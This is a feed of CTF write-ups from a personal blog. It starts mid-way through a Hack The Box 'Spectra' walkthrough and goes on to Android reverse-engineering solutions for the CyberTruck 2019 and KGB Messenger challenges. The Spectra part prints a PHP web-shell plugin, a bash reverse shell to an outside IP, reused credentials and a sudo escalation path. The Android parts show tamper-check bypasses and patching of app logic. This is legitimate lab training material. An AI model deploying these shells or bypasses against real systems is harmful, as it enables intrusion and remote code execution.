define( 'DB_PASSWORD', 'devteam01' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

</code></pre><p>Using this credentials to login as <code>administrator</code> on <code>http://spectra.htb/main/wp-admin/login.php</code> and we are in.</p>
<p><img src="/img/spectra/Pasted_image_20210617193948.png" alt="/img/spectra/Pasted_image_20210617193948.png"></p>
<p>Going to theme editor and updating 404.php</p>
<p><img src="/img/spectra/Pasted_image_20210617194207.png" alt="/img/spectra/Pasted_image_20210617194207.png"></p>
<p>Error:</p>
<p><img src="/img/spectra/Pasted_image_20210617194410.png" alt="/img/spectra/Pasted_image_20210617194410.png"></p>
<h3 id="getting-shell-by-uploading-plugin">Getting shell by uploading plugin</h3>
<pre><code>┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ cat rev.php
&lt;?php

/**
 * Plugin Name: Wordpress Reverse Shell
 * Author: fake_batman_
 */
    system($_REQUEST['cmd']);

?&gt;
┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ zip rev.zip rev.php
updating: rev.php (deflated 3%
</code></pre><p><img src="/img/spectra/Pasted_image_20210617203800.png" alt="/img/spectra/Pasted_image_20210617203800.png"></p>
<p>Upload the plugin.</p>
<p>Go to <code>view-source:&lt;http://spectra.htb/main/wp-content/plugins/rev/rev.php?cmd=id&gt;</code></p>
<p>And we get RCE</p>
<p><img src="/img/spectra/Pasted_image_20210617204606.png" alt="/img/spectra/Pasted_image_20210617204606.png"></p>
<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.14.28/4444 0&gt;&amp;1

</code></pre><h1 id="escalating-to-user">Escalating to user</h1>
<p><img src="/img/spectra/Pasted_image_20210617213606.png" alt="/img/spectra/Pasted_image_20210617213606.png"></p>
<p><img src="/img/spectra/Pasted_image_20210617213634.png" alt="/img/spectra/Pasted_image_20210617213634.png"></p>
<p><img src="/img/spectra/Pasted_image_20210617213655.png" alt="/img/spectra/Pasted_image_20210617213655.png"></p>
<p>The password <code>SummerHereWeCome!!</code> works for katie. Hehe!</p>
<pre><code>┌──(fakebatman㉿harshit-maheshwari)-[~/CTFs/htb/machines/spectra]
└─$ ssh katie@spectra.htb
Password:
katie@spectra ~ $ ls
log  user.txt
katie@spectra ~ $ cat user.txt
e89d27fe195e911*****************
</code></pre><h2 id="escalating-to-the-root">Escalating to the root</h2>
<p>We are use <code>katie</code> and need to get root.</p>
<h3 id="sudo--l-output"><code>sudo -l</code> output</h3>
<pre><code>katie@spectra /dev/shm $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl

</code></pre><p>Getting to root -&gt; <a href="https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9">https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9</a></p>
<h3 id="linpeassh-interesting-screenshots">linpeas.sh interesting screenshots</h3>
<p><img src="/img/spectra/Pasted_image_20210618001207.png" alt="/img/spectra/Pasted_image_20210618001207.png"></p>
<p>katie is in group <code>developers</code></p>
<p><img src="/img/spectra/Pasted_image_20210618001309.png" alt="/img/spectra/Pasted_image_20210618001309.png"></p>
]]></content>
        </item>
        
        <item>
            <title>Android CTF - CyberTruck Challenge 2019 </title>
            <link>https://harshitm98.github.io/posts/android-cybertruck19/</link>
            <pubDate>Wed, 04 Dec 2019 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/android-cybertruck19/</guid>
            <description>CyberTruck Challenge 2019 is a premier event to bring together a community of interest related to heavy vehicle cybersecurity issued and develop talent to address those challenges. This is a write up for their CTF. Their website can be found here and the Github profile for the challenge can found here.
Note: This was originally written on Medium and has been converted to markdown using mediumexporter
Note: I was not present during the event.</description>
            <content type="html"><![CDATA[<p>CyberTruck Challenge 2019 is a premier event to bring together a community of interest related to heavy vehicle cybersecurity issued and develop talent to address those challenges. This is a write up for their CTF. Their website can be found here and the Github profile for the challenge can found here.</p>
<p><em>Note: This was originally written on <a href="https://medium.com/bugbountywriteup/cybertruck-challenge-2019-android-ctf-e39c7f796530">Medium</a> and has been converted to markdown using <a href="https://github.com/xdamman/mediumexporter">mediumexporter</a></em></p>
<p><em>Note: I was not present during the event. All I wanted to do was practice Android CTFs and that’s when I came across their <a href="https://github.com/nowsecure/cybertruckchallenge19">Github page</a>.</em></p>
<h3 id="tools-used">Tools used</h3>
<ul>
<li>
<p><a href="https://ibotpeaches.github.io/Apktool/">ApkTool</a></p>
</li>
<li>
<p><a href="https://github.com/pxb1988/dex2jar/">dex2jar</a></p>
</li>
<li>
<p><a href="https://github.com/java-decompiler/jd-gui/releases/">jd-gui</a></p>
</li>
<li>
<p><a href="https://frida.re/docs/android/">frida</a></p>
</li>
<li>
<p><a href="https://www.radare.org/n/radare2.html">radare2</a></p>
</li>
</ul>
<h2 id="challenge-description">Challenge description</h2>
<p>A new mobile remote keyless system “CyberTruck” has been implemented by one of the most well-known car security companies “NowSecure Mobile Vehicles”. The car security company has ensured that the system is entirely uncrackable and therefore attackers will not be able to recover secrets within the mobile application.</p>
<p>If you are an experienced Android reverser, then enable the tamperproof button to harden the application before unlocking your cars. Your goal will consist on recovering up to 6 secrets in the application.</p>
<h2 id="preparing-for-the-ctf">Preparing for the CTF</h2>
<h3 id="installing-the-app">Installing the app</h3>
<p>Using adb to install the app on the phone.</p>
<p>adb install cybertruck19.apk</p>
<h3 id="decoding-the-app-using-apktool">Decoding the app using ApkTool</h3>
<p>Decode the APK using Apktool and output it into cybertruck-smali folder.</p>
<p>apktool d cybertruck19.apk -o cybertruck-smali</p>
<h3 id="converting-the-apk-in-jar-format-using-dex2jar">Converting the apk in .jar format using dex2jar</h3>
<p>I converted the .apk to jar because then I can use <strong>JD-GUI</strong> to see Java source code.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*2_E6zZYGLoHbzXVHoknouQ.png" alt="Note: I downloaded dex2jar and create a tools directory so all my tools are easily accessible"><strong>Note: I downloaded dex2jar and create a tools directory so all my tools are easily accessible</strong></p>
<p>Using <strong>JD-GUI</strong>, we open the cybertruck.jar created by the dex2jar (previous command).</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*ZO9UeWlGMJ6iUF_jLKIDmg.png" alt="Note: I downloaded jd-gui and create a tools directory so all my tools are easily accessible"><strong>Note: I downloaded jd-gui and create a tools directory so all my tools are easily accessible</strong></p>
<h3 id="launching-the-app">Launching the app</h3>
<p>As soon as we launch the app, we get this image.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*HC27j26RSGCGyorq1rpzzg.png" alt=""></p>
<p>So we try to understand what the unlock button and toggle buttons do.</p>
<h2 id="challenge-1">Challenge #1</h2>
<p><em>Challenge1 to unlock car1. “DES key: Completely Keyless. Completely safe”</em></p>
<p>To figure out what activity is being launched, let’s take a look at AndroidManifest.xml</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*lgNrddThBMQIefRoQZ-QjQ.png" alt="AndroidManifest.xml file is under cybertruck-smali directory (created by apktool)"><em>AndroidManifest.xml file is under cybertruck-smali directory (created by apktool)</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*XB65TsjaoFMw4ozIGs9VUA.png" alt="MainActivity is the activity that is being launched first"><em>MainActivity is the activity that is being launched first</em></p>
<p>So, using JD-GUI to take a look at the source code of MainActivity.class</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*w0aOQOh_VRsAfUUg29_Bzw.png" alt="Note: I downloaded jd-gui jar file inside tools directory and launch using java"><em>Note: I downloaded jd-gui jar file inside tools directory and launch using java</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*06ES7P75_kbMrd5tWZhF3w.png" alt=""></p>
<p>Looking at the onCreate function, we find the Unlock button. On clicking the unlock button, it calls this.b.k() . So we further investigate.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*9gPSJx9oCmbFKXs7oRueyQ.png" alt="Snapshot of function k"><em>Snapshot of function k</em></p>
<p>The function creates an instance of class Challenge1. So we take a look at Challenge1.class</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*O6G7O4nAz12bdpAiUXVgcg.png" alt=""></p>
<p>Static Flag for challenge1 is s3cr3t$_n3veR_mUst_bE_h4rdc0d3d_m4t3!</p>
<p>For dynamic flag, we will have to find a way to get the value returned by generateDynamicKey function in the runtime. These are exactly the scenario where Frida comes in handy. You can learn more about Frida from their <a href="https://frida.re/docs/home/">official documentation</a>.</p>
<!-- raw HTML omitted -->
<p>generateDynamicKey returns a byte array. The byte array is stored in variable result which we forward it python function on_message. Here we convert byte array to string.</p>
<h3 id="capturing-dynamic-flag">Capturing Dynamic flag</h3>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*7PVEQ4QoPLJvUlwXyzNKjg.png" alt="First we run frida-server on the android device. Then we use the flag-capture.py, to capture the dynamic flag"><em>First we run frida-server on the android device. Then we use the flag-capture.py, to capture the dynamic flag</em></p>
<p>The dynamic flag is 046e04ff67535d25dfea022033fcaaf23606b95a5c07a8c6</p>
<h2 id="challenge-2">Challenge #2</h2>
<p><em>Challenge2 to unlock car2: “AES key: Your Cell Mobile Is Your Key”</em></p>
<p>Going through the <code>this.b.k()</code> function in <code>MainActivity.class</code></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*Dzo-ZgUqs-V9ezyxpWR2xg.png" alt=""></p>
<p>Instance of class a is called. Let’s investigate further.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*hTcEQlKpyt1ClEkFJ2tChg.png" alt=""></p>
<p>So we have class a with constructor a and two functions with name a.</p>
<p>While declaring constructors, you do not have specify the return value. So public a(Context paramContext) is the constructor and the rest are functions.</p>
<p>So this file contains:</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*QY11GmOV97eaXFte38qnWw.png" alt="Constructor"><em>Constructor</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*cqV8aDib4K0fg7q_SK8pwg.png" alt="Function that takes one argument and returns byte array"><em>Function that takes one argument and returns byte array</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*T0UMh2i--l9yuOezRyZzRQ.png" alt="Function that takes two arguments and return byte array"><em>Function that takes two arguments and return byte array</em></p>
<p>Anyways, coming back to constructor a, it calls a(Context paramContext) and then its returned value is then passed as one of the arguments in a(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2)</p>
<p>So we take a look at function a(Context paramContext)</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*Q6rw5ylIwa-bqlig4YqT5Q.png" alt=""></p>
<p>File ch2.key is opened. So we take a look at its contents.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*nB1XWbSakEY5RrjKS_b0-w.png" alt=""></p>
<p>The value of static flag for Challenge2 is d474_47_r357_mu57_pR073C73D700!!</p>
<p>Now let’s take look at function a(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2)</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*ls3a6PTjEcRVWpUf8Mc39Q.png" alt=""></p>
<p>For dynamic flag, we will need to use Frida again to capture the returned value of this function</p>
<!-- raw HTML omitted -->
<p><img src="https://cdn-images-1.medium.com/max/2000/1*H5E7QZBuctqOm4x4ijhJRg.png" alt="After appending the above snippet to js_code, we rerun the flag-capture.py"><em>After appending the above snippet to js_code, we rerun the flag-capture.py</em></p>
<p>The dynamic flag for Challenge2 is 512100f7cc50c76906d23181aff63f0d642b3d947f75d360b6b15447540e4f16</p>
<h2 id="challenge-3">Challenge #3</h2>
<p><em>Challenge3 to unlock car3. “Mr Truck: Unlock me Baby!”</em></p>
<p><strong>Challenge3 description:</strong> There is an interesting string in the native code. Can you catch it?</p>
<p>Inside MainActivity.class, this native-lib.so is loaded.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*XSxqkWea5tnGJ05hugxxHw.png" alt=""></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*dIC-ILhAHsH0F9uAe32Jag.png" alt="We first locate this file and then use strings to print all the strings in the file"><em>We first locate this file and then use <strong>strings</strong> to print all the strings in the file</em></p>
<p>The static flag for this challenge is Native_c0d3_1s_h4rd3r_To_r3vers3</p>
<p>For dynamic flag, it depends upon on your device’s instruction set. In my case, it was arm64-v8a which requires you to be able to understand assembly language instructions for the same. Which seems to be out of my league (..yet!).</p>
<h3 id="how-to-bypass-tamperproof-check">How to bypass Tamperproof check?</h3>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*cj-7s8Woz1RAnjnykNbzAw.png" alt="This function checks if there is a frida server in this device"><em>This function checks if there is a frida server in this device</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*JXfcr5TDB_GnjecEs8_Veg.png" alt=""></p>
<p>This function returns true if there is frida server is present and false otherwise. So we use Frida to overwrite this function’s return value</p>
<!-- raw HTML omitted -->
<p>So that’s my solution for this CTF. I am still new to CTFs and have a lot to learn yet. Still this CTF was a good learning opportunity. Hope you also learned something.</p>
<p>Thanks for reading my write-up! Cheers! 🍺</p>
<p>Follow me on <a href="https://twitter.com/fake_batman_">Twitter</a>, <a href="https://github.com/harshitm98">Github</a> or connect on <a href="https://linkedin.com/in/harshitm98">LinkedIn</a>.</p>
]]></content>
        </item>
        
        <item>
            <title>Android CTF - KGB Messenger</title>
            <link>https://harshitm98.github.io/posts/android-kgb-messenger/</link>
            <pubDate>Wed, 04 Dec 2019 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/android-kgb-messenger/</guid>
            <description>This is a write up of an open source CTF practice challenge. The aim of this CTF is to learn how to reverse engineer an Android Application. You can find the CTF link here.
Note: This was originally written on Medium and has been converted to markdown using mediumexporter
Tools used   Apktool
  jd-gui
  Uber Apk Signer
  dex2jar
  Installing the application Make sure to connect the android phone with debugging mode enabled and then install the application.</description>
            <content type="html"><![CDATA[<p>This is a write up of an open source CTF practice challenge. The aim of this CTF is to learn how to reverse engineer an Android Application. You can find the CTF link <a href="https://github.com/tlamb96/kgb_messenger">here</a>.</p>
<p><em>Note: This was originally written on <a href="https://medium.com/@fake_batman_/android-ctf-kgb-messenger-d9069f4cedf8">Medium</a> and has been converted to markdown using <a href="https://github.com/xdamman/mediumexporter">mediumexporter</a></em></p>
<h3 id="tools-used">Tools used</h3>
<ul>
<li>
<p><a href="https://ibotpeaches.github.io/Apktool/">Apktool</a></p>
</li>
<li>
<p><a href="https://github.com/java-decompiler/jd-gui/releases/">jd-gui</a></p>
</li>
<li>
<p><a href="https://github.com/patrickfav/uber-apk-signer">Uber Apk Signer</a></p>
</li>
<li>
<p><a href="https://github.com/pxb1988/dex2jar/">dex2jar</a></p>
</li>
</ul>
<h3 id="installing-the-application"><strong>Installing the application</strong></h3>
<p>Make sure to connect the android phone with debugging mode enabled and then install the application.</p>
<p>adb install kgb-messenger.apk</p>
<h3 id="decoding-using-apktool">Decoding using Apktool</h3>
<p>Decode the APK using Apktool and output it into kgb-smali folder.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*Bi7Q_rVomlGzdFko5DJlIw.png" alt=""></p>
<h3 id="converting-the-apk-in-jar-format-using-dex2jar">Converting the apk in .jar format using dex2jar</h3>
<p>We convert to jar because then we can use <strong>JD-GUI</strong> to see Java code.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*c5DGqjKODExd_TJl" alt=""></p>
<p>Using <strong>JD-GUI</strong>, we open the kgb-jar.jar created by the dex2jar (previous command).</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*-PNbYjV-6jDsq1ISkKAvnA.png" alt="Note: I downloaded JD-GUI and created a directory called tools and move it to that directory">
<em><strong>Note</strong>: I downloaded JD-GUI and created a directory called tools and move it to that directory</em></p>
<h3 id="launching-the-app-now"><strong>Launching the app now</strong></h3>
<p>As soon as we launch the app we get this error.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*yXOwagk_u6Fq_PwrsdRXSw.jpeg" alt=""></p>
<p>To see what is causing this error, we need to see which Activity is being launched first. So we open AndroidManifest.xml which can be found inside kgb-smali (Files created by apktool)</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*abkleTtjpX__IeiSd2HShQ.png" alt=""></p>
<p>Using vim editor, we open AndroidManifest.xml</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*oVI2pqnG3OaqOWbwKL1JRA.png" alt="Snippet of part of AndroidManifest.xml">
<em>Snippet of part of AndroidManifest.xml</em></p>
<p>MainActivity is the activity that is launched first. So use JD-GUI to view MainActivity.class</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*nl_NWIixkGk4_K5bKXifGQ.png" alt=""></p>
<p>We can see, when the activity is created, two string values are checked. First str1 is checked if it equals to <em>Russia. <em>Similarly, str2</em></em> <strong>is checked if it equals to getResources().getString(<em>2131558400</em>).</strong> **The number is numerical representation for the value of string stored in <a href="https://developer.android.com/guide/topics/resources/string-resource">strings.xml</a> file.</p>
<p>Since we also have the .smali** **files inside smali folder created by Apktool, we open MainActivity.smali and locate this particular line getResources().getString(2131558400)</p>
<p>Before that we need to represent 2131558400 in hex format so that it becomes easier for us to find the value inside of smali code.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*u1KvXOorF9aFAI55s7l9hg.png" alt=""></p>
<p>So we open MainActivity.smali file using Vim editor.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*PbT0zbT5PyaccPDk" alt=""></p>
<p>Now, we try to locate the String resource which has the id 0x7f0d0000 and is being compared to str2.</p>
<p>We go to the **res/values <strong>directory and search where does 0x7f0d0000</strong> **occurs</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*pS-1flAXQrOjTtRRqtHoHA.png" alt=""></p>
<p>We see that the name is <strong>“User”</strong> and type is <strong>“string”</strong>. So we search for **“User” **and in strings.xml file the name=”User” has value encoded using Base64. We docode it.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*_5l9saOR-njueyJgldPSZQ.png" alt=""></p>
<h2 id="capturing-the-second-flag">Capturing the Second Flag</h2>
<p><em>To capture the second flag we need to go to the next activity, that is LoginActivity.</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*hI8Kajk8qBuNzrs2IQxABA.png" alt="onCreate method of MainActivity">
<em>onCreate method of MainActivity</em></p>
<p>In order to get to LoginActivity, we need to find a way to get through both if conditions or we could just remove them.</p>
<p>Let’s open the .smali version of MainActivity.class to remove the code responsible for both if conditions.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*eqJBxvnnE2HQL2tz" alt="Smali version of first condition">
<em>Smali version of first condition</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*LoOSIYFg4CN0OeVw" alt="Smali version of second condition">
<em>Smali version of second condition</em></p>
<h3 id="getting-rid-of-both-conditions">Getting rid of both conditions</h3>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*maA0rMCkgZiglXk_" alt="Selecting the code for removal">
<em>Selecting the code for removal</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*FEm9b0f8VqTC-5AU" alt="After removal">
<em>After removal</em></p>
<p><em>Note: Make sure after removing your code looks this and ends with goto :go_to_0</em></p>
<h3 id="building-the-apk">Building the apk</h3>
<p>After making the changes we need to build the apk. So we build the apk using Apktool.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*kZVaENKs7Wq_CZaSxLXuog.png" alt=""></p>
<h3 id="signing-the-apk">Signing the apk</h3>
<p>We cannot directly install the apk. We need to <a href="http://www.androiddocs.com/tools/publishing/app-signing.html">sign</a> them first. However, since we are not the original developers of this app, we will Uber Apk Signer for this purpose.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*S4gIFG1JJDynyUND" alt="Note: I downloaded Uber Apk Signer and created a directory called tools and move it to that directory">
<em><strong>Note:</strong> I downloaded Uber Apk Signer and created a directory called tools and move it to that directory</em></p>
<h3 id="installing-and-running-the-modified-apk">Installing and running the modified apk</h3>
<p>Now when we launch, we are directly taken to LoginActivity.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*iXBg8Htuw8wb2s7UUA3nWA.jpeg" alt=""></p>
<p>Now we have to find out what the username and password is. Let’s take a look at the source code again but this time for LoginActivity using JD-GUI</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*EhH3Q8kmfI9m3vGOml_Pxg.png" alt=""></p>
<p>Inside onLogin method, we have two edit text who are converted to string. EditText1 is converted to string n and EditText2 is converted to string o. Right now we do not know which EditText corresponds to username and password.</p>
<h3 id="finding-username">Finding username</h3>
<p>We look at the first nested if condition, string n is being compared to a resource with id 2131158450. So we convert it to hex code again and check if we can find the corresponding string name.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*CuTQtfLwnPq9Ig-DFRx8Dg.png" alt="Finding the username value by using id which is found using hex code of 2131158450">
<em>Finding the <strong>username</strong> value by using id which is found using hex code of 2131158450</em></p>
<p>So the username is <strong>codenameduchess</strong>.</p>
<h3 id="finding-password">Finding password</h3>
<p>Let’s try to find the password using the same method used for username.</p>
<p>We go through the code again, and can see that function j should return false.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*1VnPhBbncBCYlqwqgiAONA.png" alt=""></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*etHk9x6vEt-GcyS6fpqo7w.png" alt=""></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*C9aaQCw1cJOEJ9hNA-vQLw.png" alt=""></p>
<p>Here, the string o is hashed using MD5 and then compared with string resource id 2131558446.</p>
<p>We try to find the value of hash from strings.xml and would use findmyhashto find its original value.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*iE1i-MlasrMZ50Z2TcBGtA.png" alt=""></p>
<p>We get hash value in the strings.xml, but when we try to use findmyhash to find the hash’s original value, we do not get any results.
The question did say that we would have to use social engineering to get the password. So we try googling <strong>codenameduchess</strong>.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*pQfTGuSgeW_bAWoS" alt="Google result for codenameduchess">
<em>Google result for codenameduchess</em></p>
<p>The name of account <strong>‘Sterling Archer’</strong> also checks out with the first flag. So we take a look at it’s twitter account.</p>
<p><img src="https://cdn-images-1.medium.com/max/2462/0*5efkfUlhLBwWccQC" alt="Twitter page for codenameduchess (Sterling Archer)">
<em>Twitter page for codenameduchess (Sterling Archer)</em></p>
<p>It looks like it is a character of a TV show. We now try to Google for codename duchess password.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*kCTg8tkgzelbTbQr" alt="Google result for codename duchess password">
<em>Google result for codename duchess password</em></p>
<p>We open the PDF, and search through it for password.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*RUhLhqm0GDv_H5va" alt=""></p>
<p>According to this, the password is <strong>Guest</strong>. So we input the password as ‘<strong>guest</strong>’ (all lowercase).</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*exESxY33phclNRn3z6I-mw.jpeg" alt=""></p>
<p>And..we are in. The Flag is <strong>G00G13_PR0</strong>.</p>
<h3 id="checking-the-value-of-hash">Checking the value of hash</h3>
<p>Just for fun, let’s see why could we not find the hash. So when we calculate the MD5 hash of guest, we get</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*XLjWrxUB6xRbFgBp" alt=""></p>
<p>So the reason we were not able to find the result was the hash we had was incomplete (did not have the zero at the start).</p>
<h2 id="capturing-the-third-flag">Capturing the third flag</h2>
<p><em>After logging in, we are taken to MessageActivity. There’s where we will find our third flag.</em></p>
<p>So we open MessageActivity using JD-GUI, we take a look at the source code.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*LMB1vOs34Zg_KVtC" alt="Function onSendMessage from MessageActivity">
<em>Function onSendMessage from MessageActivity</em></p>
<p>Whenever we send the message, onSendMessage function is called, and the text entered using EditText is converted to String str.</p>
<p>Now if we look closely, the string <strong>str</strong> is passed to a function named **a **on which equals function is called to check if it is equal to <strong>p</strong>.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*gzeSfauvA_nblVaC" alt=""></p>
<p>The value of <strong>p</strong> is:</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*ftWhJr5rN_ZSA-rNzTEx6Q.png" alt=""></p>
<p>Now, let’s take a look at function a</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*serjcz7YzZkD70kI" alt=""></p>
<p>Function a** **returns string. In this function, the value of string passed as an argument obtained by:</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*WNgLkw-NgbZvZJ3sfACG8g.png" alt="Visual representation of the function a">
<em>Visual representation of the function a</em></p>
<p>So, the value of <strong>p</strong> equals to the parameter string passed to this function <strong>a</strong>. So, we can reverse engineer the original value of <strong>p</strong> by doing these steps in reverse. As we know (A XOR B) XOR B = A, we can use this to find the original value of the string:</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*vC6PV5N1cytGKcOEcW_lvw.png" alt="Visual representation of function where we XOR again">
<em>Visual representation of function where we XOR again</em></p>
<p>We recreate this above algorithm using Python:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;V@]EAASB</span><span style="color:#ae81ff">\022</span><span style="color:#e6db74">WZF</span><span style="color:#ae81ff">\022</span><span style="color:#e6db74">e,a$7(&amp;am2(3.</span><span style="color:#ae81ff">\003</span><span style="color:#e6db74">&#34;</span>
p <span style="color:#f92672">=</span> list(str(p))

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(p) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>):
	p[i] <span style="color:#f92672">=</span> chr(ord(p[i]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x32</span>)
	p[len(p) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> i] <span style="color:#f92672">=</span> chr(ord(p[len(p) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> i]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x41</span>)

p<span style="color:#f92672">.</span>reverse()
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</code></pre></div><p>When we run this file, we get</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*e4tzOJ7YacoD7-fm" alt=""></p>
<p>So we enter this string as the input for the EditText of the app:</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*OdUTNQfQSU42HpxQlN-QsA.png" alt=""></p>
<p>Similarly, the input from the EditText is passed through function b and check if it equals to string r.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*Gr-cQn_dQSM88B4JbftQWQ.png" alt="The value of String r">
<em>The value of String r</em></p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*kDT9QhVm015Q5pY6" alt="Function b whose returned value is compared to String r">
<em>Function b whose returned value is compared to String r</em></p>
<p>While converting the smali code to java class, there seems to be some problem. The code can be refactored so it can be better understood.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*LSNKMof9nI_hhx0W" alt="Just a readable version of function b">
<em>Just a readable version of function b</em></p>
<p>Here it is not possible to reverse engineer, so we try to brute force our way in. We check for what values of loop iterable i and alphabet, we get the output r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> string

r <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">dslp}oQ</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74"> dks$|M</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">h +AYQg</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">P*!M$gQ</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">&#34;</span>
r <span style="color:#f92672">=</span> list(str(r))
r<span style="color:#f92672">.</span>reverse()

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(r)):
	<span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
		<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;_&#34;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
		<span style="color:#66d9ef">continue</span> 
</code></pre></div><p>After running this file, we get the output.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/0*2l3YUXwHRTiocYUK" alt=""></p>
<p>The values for every 8th position is ‘_’ because we have i%8 == 0. And irrespective of the alphabets, the output from the function is 0, so it is difficult to find the answer using brute force.</p>
<p>So the message could be <strong>May I <em>PLEASE</em> have the password</strong>.</p>
<p>Let’s put this message</p>
<p><img src="https://cdn-images-1.medium.com/max/2160/1*Q3uWdINI9QQ9NF4EpMtaig.jpeg" alt=""></p>
<p>Third flag captured.</p>
<h3 id="why-did-not-directly-type-this-message-and-type-the-message-before">Why did not directly type this message and type the message before?</h3>
<p>To understand this, we need to see how the flag is calculated. Function i is responsible for calculating the flag. Let’s see how</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*6gHnhid59KUUj7mDg54lkw.png" alt=""></p>
